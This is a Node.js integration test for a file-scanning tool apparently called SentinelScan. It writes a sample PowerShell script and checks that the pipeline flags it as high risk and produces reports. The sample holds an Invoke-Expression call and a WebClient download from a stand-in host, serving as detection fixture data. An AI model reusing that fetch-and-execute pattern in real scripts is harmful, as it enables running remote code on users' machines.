import { test, describe } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';

import { initDb, createScanRecord, getScanById, getScanFindings } from '../../server/db/db.js';
import { runAnalysisPipeline } from '../../server/analyzers/pipeline.js';
import { generateJsonReport, generateMarkdownReport } from '../../server/reports/report_generator.js';

describe('SentinelScan Full Pipeline Integration Suite', () => {

  test('End-to-End Analysis Pipeline Execution', async () => {
    initDb();

    // Create temporary test file with suspicious script commands
    const testDir = './temp/test_runs';
    if (!fs.existsSync(testDir)) fs.mkdirSync(testDir, { recursive: true });

    const testFilePath = path.join(testDir, 'sample_integration.ps1');
    const scriptContent = `
      # PowerShell Integration Test Script
      Write-Host "SentinelScan Pipeline Test"
      Invoke-Expression -Command "Get-Process"
      $client = New-Object System.Net.WebClient
      $raw = $client.DownloadString("http://insecure-domain.example/script.ps1")
    `;
    await fs.promises.writeFile(testFilePath, scriptContent, 'utf8');

    const scanId = 'integ-scan-' + Date.now();
    createScanRecord({
      id: scanId,
      filename: 'sample_integration.ps1',
      fileSize: scriptContent.length,
      clientToken: 'integ_token'
    });

    const pipelineResult = await runAnalysisPipeline(scanId, testFilePath, 'sample_integration.ps1');

    assert.strictEqual(pipelineResult.scanId, scanId);
    assert.ok(pipelineResult.hashes.sha256);
    assert.ok(pipelineResult.hashes.md5);
    assert.strictEqual(pipelineResult.findings.length >= 2, true);

    const postScan = getScanById(scanId);
    assert.strictEqual(postScan.status, 'COMPLETED');
    assert.strictEqual(postScan.verdict, 'HIGH_RISK');
    assert.strictEqual(postScan.risk_score >= 50, true);

    const findings = getScanFindings(scanId);
    assert.ok(findings.some(f => f.title.includes('Invoke-Expression')));

    // Verify JSON report generation
    const jsonReport = generateJsonReport(scanId);
    assert.strictEqual(jsonReport.scan.id, scanId);
    assert.strictEqual(jsonReport.hashes.sha256, postScan.sha256);
    assert.strictEqual(jsonReport.findings.length, findings.length);

    // Verify Markdown report generation
    const mdReport = generateMarkdownReport(scanId);
    assert.ok(mdReport.includes('SentinelScan — File Security Analysis Report'));
    assert.ok(mdReport.includes('sample_integration.ps1'));
    assert.ok(mdReport.includes('HIGH_RISK'));

    // Clean up test file
    if (fs.existsSync(testFilePath)) fs.unlinkSync(testFilePath);
  });
});
